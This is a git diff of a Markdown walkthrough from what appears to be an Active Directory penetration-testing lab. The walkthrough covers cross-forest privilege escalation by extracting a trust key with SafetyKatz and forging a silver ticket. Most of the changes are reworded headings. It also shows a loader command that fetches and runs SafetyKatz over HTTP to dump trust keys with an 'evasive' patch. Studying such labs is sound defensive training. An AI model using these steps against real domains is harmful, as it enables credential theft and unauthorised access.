@@ -1,22 +1,27 @@
-# Learning Objective 20 (Privilege Escalation | Across External Trusts - Trust Key Abuse)
+# Learning Objective 20 (Privilege Escalation | Across Forest Trusts - Trust Key Abuse)
 
 ## Tasks
 
-1. **With DA privileges on `dollarcorp.moneycorp.local`, get access to `SharedwithDCorp` share on the DC of `eurocorp.local` forest**
+1. **Using DA access to `dollarcorp.moneycorp.local`, extract the trust key for `eurocorp.local` and forge a silver ticket to get access to `SharedwithDCorp` share on the DC of `eurocorp.local` forest**
+
+---
+
+## Attack Path Steps
+
+- **Access to the Forest 1 DC with DA Privileges**
+- **Extract from the Forest 1 DC the Trust Key for the Forest 2**
+- **Forge a Silver Ticket (without EA SID History) using the Trust Key from the Forest 1 DC for Access to the Shared Resources of the Forest 2 DC**
+- **Leverage the Forged Ticket to Gain Access to the Shared Resources of the Forest 2 DC**
 
 ---
 
 ## Solution
 
-1. **With DA privileges on `dollarcorp.moneycorp.local`, get access to `SharedwithDCorp` share on the DC of `eurocorp.local` forest**
+1. **Using DA access to `dollarcorp.moneycorp.local`, extract the trust key for `eurocorp.local` and forge a silver ticket to get access to `SharedwithDCorp` share on the DC of `eurocorp.local` forest**
 
-**Extract the trust key**
+- **Access to the Forest 1 DC with DA Privileges**
 
-We need the trust key for the trust between `dollarcorp` and `eurocrop`, which can be retrieved using Mimikatz or SafetyKatz.
-
-Start a process with DA privileges.
-
-Run the below command **from an elevated command prompt**.
+We need the trust key for the trust between `dollarcorp` (forest 1) and `eurocrop` (forest 2), which can be retrieved using Mimikatz or SafetyKatz.
 
 ![Run as administrator](./assets/screenshots/learning_objectives_run_as_administrator.png)
 
@@ -110,6 +115,10 @@ C:\Users\svcadmin>
 
 ![HFS - SafetyKatz.exe](./assets/screenshots/learning_objective_20_hfs_safetykatz.png)
 
+- **Extract from the Forest 1 DC the Trust Key for the Forest 2**
+
+**We require the trust key for the inter-forest trust from the DC that has the external trust.**
+
 `C:\Users\Public\Loader.exe -path http://127.0.0.1:8080/SafetyKatz.exe -args "lsadump::evasive-trust /patch" "exit"`:
 ```
 [SNIP]
@@ -130,9 +139,9 @@ Domain: EUROCORP.LOCAL🏛️ (ecorp / S-1-5-21-3333069040-3914854601-3606488808
 [SNIP]
 ```
 
-**Forge a referral ticket**
+- **Forge a Silver Ticket (without EA SID History) using the Trust Key from the Forest 1 DC for Access to the Shared Resources of the Forest 2 DC**
 
-Let's forge a referral ticket. Note that **we are not injecting any SID History here** as it would be filtered out. Run the below command.
+**Note that we are not injecting any SID History here as it would be filtered out.**
 
 ![dcorp-std422 | student422](https://custom-icon-badges.demolab.com/badge/dcorp--std422-student422-64b5f6?logo=windows11&logoColor=white)
 
@@ -241,6 +250,8 @@ Cached Tickets: (1)
 ```
 
 Once the ticket is injected, we can access explicitly shared resources on `eurocorp-dc`.
+
+- **Leverage the Forged Ticket to Gain Access to the Shared Resources of the Forest 2 DC**
 
 **Note that the only way to enumerate accessible resources (service on a machine) in `eurocorp` would be to request a TGS for each one and then attempt to access it.**
 
